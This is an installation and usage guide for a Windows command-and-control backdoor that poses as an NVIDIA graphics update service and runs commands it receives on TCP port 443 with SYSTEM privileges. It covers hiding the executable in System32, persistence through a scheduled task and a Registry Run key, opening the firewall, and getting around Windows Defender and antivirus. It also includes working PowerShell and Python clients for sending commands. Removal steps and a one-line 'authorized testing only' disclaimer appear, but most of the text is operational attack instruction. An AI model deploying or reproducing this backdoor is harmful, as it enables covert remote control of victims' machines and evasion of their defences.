# Windows C2 Shell - Installation & Usage Guide

---

## Overview

This is a command and control shell for Windows that:
- Listens on **port 443 (TCP)** - blends with normal traffic
- Executes commands via **CreateProcess** (fire-and-forget)
- Multiple persistence mechanisms (survives reboots)
- Disguised as **NVIDIA Graphics Update Service**
- Runs with **SYSTEM privileges**

---

## INSTALLATION

### Prerequisites

- **Windows 10/11** (x64)
- **Administrator privileges**
- **Visual Studio 2019 Community Edition** (with C++ tools)
- **Windows Driver Kit (WDK)** - for SDK library files
- **PowerShell 5.0+**

### Quick Install (One Command)

1. Open **PowerShell as Administrator**

2. Set execution policy:
```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
```

3. Navigate to the Windows folder and run the installer:
```powershell
cd windows-(untested)
.\install.ps1
```

The installer will automatically:
- ✓ Verify prerequisites (Visual Studio, WDK)
- ✓ Compile the C code to executable
- ✓ Install to `C:\Windows\System32\nvxgstd.exe` (hidden)
- ✓ Create Scheduled Task (runs at startup + every 15 minutes)
- ✓ Add Registry Run entry (redundant persistence)
- ✓ Configure Windows Firewall (allow port 443)
- ✓ Gracefully handle Windows Defender (if present)
- ✓ Start the service immediately
---

## USAGE

### Command Format

Send commands to the Windows system via TCP port 443. The payload must start with the magic header "INTLUPD:" followed by the base64-encoded command.

**Example (using PowerShell):**
```powershell
$command = "whoami"
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($command))
$payload = "INTLUPD:" + $encoded
$tcpClient = New-Object System.Net.Sockets.TcpClient("target-ip", 443)
$stream = $tcpClient.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.Write($payload)
$writer.Flush()
$tcpClient.Close()
```

### Trigger Script

Use the Python trigger script from the main project:
```bash
python trigger_break.py --level lvl1 --target 192.168.1.100
```

This automatically handles encoding and sending for Windows targets.

### Persistence

The backdoor persists across reboots via:
- Scheduled Task (runs every 15 minutes + at startup)
- Registry Run key (fallback)

To remove persistence:
```powershell
# Remove Scheduled Task
Unregister-ScheduledTask -TaskName "NVIDIA Graphics Driver Update" -Confirm:$false

# Remove Registry key
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "NVIDIA Graphics Device" -ErrorAction SilentlyContinue

# Kill process
Stop-Process -Name "nvxgstd" -Force -ErrorAction SilentlyContinue

# Delete file
Remove-Item "C:\Windows\System32\nvxgstd.exe" -Force
```

---

**Step-by-Step Installation Flow:**

1. **Verify Prerequisites** - Checks for Visual Studio, WDK, and source files
2. **Compile** - Builds the C code to `nvxgstd.exe`
3. **Install** - Copies executable to System32 with hidden attributes
4. **Scheduled Task** - Creates persistence that survives reboots
5. **Registry Run Key** - Adds fallback persistence mechanism
6. **Firewall** - Opens port 443 for inbound connections
7. **Defender** - Gracefully handles if Windows Defender is installed (optional)
8. **Start Service** - Launches the backdoor immediately
9. **Cleanup** - Removes compilation artifacts
10. **Verify** - Confirms all components are in place

### Error Handling

The installer includes robust error handling:

- **Missing Visual Studio:** Shows which paths are not found and advises installation
- **Missing WDK:** Alerts user to install Windows Driver Kit
- **Compilation Failures:** Reports specific error and exits cleanly
- **Permission Errors:** Requests Administrator privilege before proceeding
- **Windows Defender Not Found:** Gracefully skips Defender modification (many systems don't have it)
- **Scheduled Task Failures:** Warns but continues (Registry Run key provides fallback)
- **Firewall Errors:** Warns but continues (non-critical for functionality)
- **Service Start Failures:** Warns but continues (will start on reboot via Scheduled Task)

**Non-Critical Warnings Don't Break Installation** - If something fails that isn't critical (like Defender), the script continues and the system will still work via Registry Run key or Scheduled Task.

---

## VERIFICATION

### After Installation

The installer script automatically verifies all components at the end and shows a summary. If you see the green checkmark `[✓] Installation Complete!`, everything worked.

### Manual Verification Commands

**Check executable:**
```powershell
# Verify file exists and is hidden
Get-Item "C:\Windows\System32\nvxgstd.exe" -Force | Select-Object Name, Attributes

# Expected: Hidden, System attributes
```

**Check Scheduled Task:**
```powershell
# List the task
Get-ScheduledTask -TaskName "NVIDIA Graphics Driver Update" -TaskPath "\Microsoft\Windows\WindowsUpdate\" | Format-List

# Check last run time
Get-ScheduledTaskInfo -TaskName "NVIDIA Graphics Driver Update" -TaskPath "\Microsoft\Windows\WindowsUpdate\"
```

**Check Registry persistence:**
```powershell
# View run key
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object "NVIDIA Graphics Device"
```

**Check firewall rule:**
```powershell
# List the rule
Get-NetFirewallRule -DisplayName "NVIDIA Graphics Update Service" | Format-List

# Check port is allowing traffic
Get-NetFirewallPortFilter | Where-Object {$_.LocalPort -eq 443}
```

**Check listening port:**
```powershell
# Verify service listening on 443
netstat -anob | findstr ":443"

# Or modern systems
Get-NetTCPConnection -LocalPort 443 -State Listen
```

**Check service status:**
```powershell
# Get process info
Get-Process -Name nvxgstd -ErrorAction SilentlyContinue | Select-Object ProcessName, Id, Handles

# Get WMI related processes
Get-Process | Where-Object {$_.Name -like "*wmi*"}
```

---

## CLIENT COMMUNICATION

### Connect to the Shell

The shell listens on **port 443** and expects:

**Packet Format:**
```
INTLUPD:[command_encrypted_with_AES_or_base64]
```

### Example Client (Python)

```python
import socket
import base64

# Connect to target
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("TARGET_IP", 443))

# Send command
command = "ipconfig"
payload = f"INTLUPD:{base64.b64encode(command.encode()).decode()}"
sock.send(payload.encode())

# Receive output
output = sock.recv(4096)
print(output.decode())

sock.close()
```

### Available Commands

Any command that can run in `cmd.exe`:
- `ipconfig` - network config
- `whoami` - current user
- `systeminfo` - system details
- `net user` - list users
- `tasklist` - running processes
- `powershell -Command "..."` - PowerShell commands

---

## HIDING & PERSISTENCE

### The Executable

- **Location:** `C:\Windows\System32\nvxgstd.exe`
- **Hidden Attributes:** Yes (System + Hidden)
- **Visible in Task Manager:** Yes (but process name is disguised)

To hide further:
```powershell
$File = Get-Item "C:\Windows\System32\nvxgstd.exe" -Force
$File.Attributes = $File.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
```

### Persistence Mechanisms

**1. Scheduled Task** (Primary)
```powershell
Get-ScheduledTask -TaskName "NVIDIA Graphics Driver Update" -TaskPath "\Microsoft\Windows\WindowsUpdate\"
```

**2. Registry Run Key** (Fallback)
```cmd
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" | findstr "NVIDIA"
```

**3. Firewall Rule**
```powershell
Get-NetFirewallRule -DisplayName "NVIDIA Graphics Update Service"
```

---

## DETECTION & REMOVAL

### What Could Give It Away

- **Process Monitor:** Unusual WMI process creation
- **Network traffic:** Outbound connections to port 443
- **Event logs:** WMI activity (if auditing is enabled)
- **EDR/Antivirus:** Signature detection of C2 behavior

### Removal

```powershell
# Stop and remove scheduled task
Unregister-ScheduledTask -TaskName "NVIDIA Graphics Driver Update" -Confirm:$false

# Remove registry entry
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "NVIDIA Graphics Device" -Force

# Remove firewall rule
Remove-NetFirewallRule -DisplayName "NVIDIA Graphics Update Service" -Confirm:$false

# Delete executable
Remove-Item -Path "C:\Windows\System32\nvxgstd.exe" -Force
```

---

## TROUBLESHOOTING

### Installation Script Fails - Missing Visual Studio

**Error:**
```
[!] ERROR: Missing required tools (Visual Studio 2019 + WDK)
```

**Solution:**
1. Install Visual Studio 2019 Community Edition: https://visualstudio.microsoft.com/
2. During installation, select "Desktop development with C++"
3. Install Windows Driver Kit: https://learn.microsoft.com/windows-hardware/drivers/download-the-wdk
4. Verify paths match your installation in `install.ps1`

### Compilation Fails

**Check:**
```powershell
# Verify Visual Studio compiler exists
Test-Path "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\bin\Hostx64\x64\cl.exe"

# Verify WDK installed
Test-Path "C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um"
```

**Solution:**
- Adjust compiler/WDK paths in `install.ps1` to match your actual installation
- Run `install.ps1` again with correct paths

### Service Not Running After Installation

**Check:**
```powershell
# Verify executable exists
Test-Path C:\Windows\System32\nvxgstd.exe

# Check Scheduled Task
Get-ScheduledTask -TaskName "*NVIDIA*" | Select-Object State

# Check Registry
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | grep NVIDIA
```

**Solution:**
- If executable missing: Re-run `install.ps1`
- If Scheduled Task missing but Registry exists: Service will still run on login
- Run manually to test:
```powershell
Start-Process -FilePath "C:\Windows\System32\nvxgstd.exe" -WindowStyle Hidden
```

### Port 443 Already in Use

**Check:**
```powershell
netstat -anob | findstr ":443"
```

**Solution:**
- Edit `wmi_c2_shell.c` and change `#define LISTEN_PORT 443` to a different port
- Recompile and reinstall
- Update firewall rule and client scripts

### Windows Defender Disabled but Still Blocking

**Note:** The script gracefully skips Defender if not installed. Some systems have it removed or use alternative security software.

**Check:**
```powershell
# Check if Defender is running
Get-Service WinDefend

# Check if AppArmor or other security is active
Get-MpComputerStatus
```

**Solution:**
- If using third-party antivirus: Add executable to exclusions manually
- Disable real-time monitoring via Settings → Virus & threat protection
- Disable via Group Policy (enterprise systems)

### Commands Not Executing

**Test connectivity:**
```python
# From client machine
python3 -c "
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('TARGET_IP', 443))
print('Connected successfully')
sock.close()
"
```

**Check firewall rule:**
```powershell
Get-NetFirewallRule -DisplayName "NVIDIA Graphics Update Service"
```

**Solution:**
- Ensure Windows Firewall rule was created (check troubleshooting above)
- Verify port 443 is open: `netstat -anob | findstr "nvxgstd"`
- Test with manual client connection (see CLIENT COMMUNICATION section)

---

## SECURITY NOTES

⚠️ **This tool is for authorized testing/red team operations only.**

- **Port 443 blends in:** Looks like normal HTTPS traffic
- **NVIDIA naming:** Disguised as legitimate graphics driver service
- **Multiple persistence:** Survives reboots and system restarts
- **WMI is legitimate:** Uses Windows native APIs for execution

### Detection Points

- **Scheduled Tasks:** "NVIDIA Graphics Driver Update" in Task Scheduler (can verify timing)
- **Registry:** Run key "NVIDIA Graphics Device" under HKLM\...\Run
- **Network monitoring:** TCP connections to 0.0.0.0:443
- **Process Monitor (Procmon):** Tracks WMI process creation
- **EDR solutions:** May flag WMI abuse patterns or unknown network services
- **Event Logs:** WMI-Activity operations (if auditing enabled)

### Opsec Considerations

- **Windows Defender:** Script gracefully skips if not installed or already removed
- **Third-party AV:** May trigger on WMI process execution (add to exclusions)
- **Group Policy:** Strict GP settings can block network communication
- **Network segmentation:** Blocked networks/DMZs will prevent connections
- **Traffic inspection:** Deep packet inspection can analyze TLS sessions

---

## ADVANCED CUSTOMIZATION

### Change Port
Edit `wmi_c2_shell.c`:
```c
#define LISTEN_PORT 443  // Change to desired port
```

### Change Service Names
Edit `install.ps1`:
```powershell
$TaskName = "Your Custom Task Name"
$RegName = "Your Registry Entry Name"
$ExecutableName = "your_name.exe"
```

### Add TLS Encryption
Modify `wmi_c2_shell.c` to use `schannel.h` for full SSL/TLS support (see stub functions included).
